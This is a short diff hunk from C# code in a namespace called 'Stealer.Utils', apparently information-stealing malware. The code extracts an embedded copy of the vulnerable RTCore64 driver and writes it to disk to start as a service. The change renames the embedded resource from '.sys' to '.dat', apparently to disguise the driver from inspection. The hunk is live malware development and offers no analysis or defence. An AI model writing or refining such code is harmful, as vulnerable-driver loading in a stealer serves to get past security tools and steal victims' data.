@@ -134,7 +134,7 @@ namespace Stealer.Utils
             try
             {
                 // 1. Extract embedded RTCore64.sys and start service
-                byte[] vulnBytes = GetEmbeddedDriverBytes("RTCore64.sys");
+                byte[] vulnBytes = GetEmbeddedDriverBytes("RTCore64.dat");
                 if (vulnBytes != null && vulnBytes.Length > 0)
                 {
                     File.WriteAllBytes(vulnSysPath, vulnBytes);
